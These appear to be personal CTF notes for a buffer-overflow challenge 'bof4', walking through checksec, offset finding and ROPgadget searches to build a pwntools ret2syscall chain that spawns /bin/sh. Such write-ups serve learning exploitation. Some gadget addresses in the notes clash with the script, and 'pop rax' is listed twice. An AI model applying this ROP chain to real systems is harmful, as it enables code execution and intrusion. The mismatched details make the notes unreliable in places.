- `file ./bof4`
  ![[bof4_JHT-1.png]]
- `pwndbg bof4` -> `checksec`
  ![[bof4_JHT-2.png]]
- decompile
  ![[bof4_JHT-3.png]]
- nx on, canary found, statically linked -> ret2syscall using ROP
- find offset: `cylic 100` -> `cyclic -l` -> offset=88
  ![[bof4_JHT-4.png]]
- to use `syscall` or execve(), we need 4 parameters: 
	- `rax = 59`, a code number to invoke the `syscall` in kernel
	- `[rdi] = "/bin/sh"`, note `rdi` must hold addr (pointer)
	- `rsi = 0`, `argv`
	- `rdx = 0`, envp
- with `rdi`, need to add `"/bin/sh"` to a empty addr, and set rdi point to that addr
- `vmmap`
  ![[bof4_JHT-5.png]]
- so from 0x406000 to 0x4080000, we can read + write -> choose one addr -> `0x00406be0`
  ![[bof4_JHT-6.png]]
- to write `"/bin/sh"` to that addr, we use `gets` to get input
- using `i func`, we got `gets` func addr `0x0000000000401510`
  ![[bof4_JHT-7.png]]
- or `disas main`, as it uses `gets`
  ![[bof4_JHT-8.png]]
- `gets` will save input (parameter) in `rdi`, so we will have 2 steps, first save "/bin/sh" in rdi, and then do the rest
- now we need to find gadgets, `rax`, `rdi`, `rsi`, `rdx`
	- `ROPgadget --binary bof4 | grep "pop rax"` -> `0x0000000000401001`
	- `ROPgadget --binary bof4 | grep "pop rdi"` -> `0x0000000000401001`
	- `ROPgadget --binary bof4 | grep "pop rsi"` -> `0x00000000004015ae`
	- `ROPgadget --binary bof4 | grep "pop rax"` -> `0x00000000004043e4`
	![[bof4_JHT-9.png]]
	- notice that `pop rdx` has extra `add rsp, 0x28`, so in payload we have to add 0x28 padding
- and `syscall` too: `ROPgadget --binary bof4 | grep "syscall"` -> `0x000000000040132e`
- payload = offset(88) + pop_rdi + empty_addr + gets_addr
- payload += pop_rax + 59 + pop_rdi + empty_addr + pop_rsi + 0 + pop_rdx + 0
- payload += padding(0x28)
- finally script:
  ```python
	pop_rax = 0x0000000000401001
	pop_rdi = 0x000000000040220e
	pop_rsi = 0x00000000004015ae
	pop_rdx = 0x00000000004043e4 #with 28 padding
	write_addr = 0x00406be0
	bin_sh = b'/bin/sh\x00'
	gets=0x0000000000401510
	syscall = 0x000000000040132e
	# step 1
	payload = 88*b'A'
	payload += p64(pop_rdi)
	payload += p64(write_addr)
	payload += p64(gets)
	# step 2
	payload+= p64(pop_rax)
	payload+= p64(59)
	payload+= p64(pop_rdi)
	payload+= p64(write_addr)
	payload+= p64(pop_rsi)
	payload+= p64(0)
	payload+= p64(pop_rdx)
	payload+= p64(0)
	payload+= 0x28 * b'B'
	payload+= p64(syscall)
	p.sendlineafter(b'Say something: ', payload)
	p.sendline(bin_sh)
  ```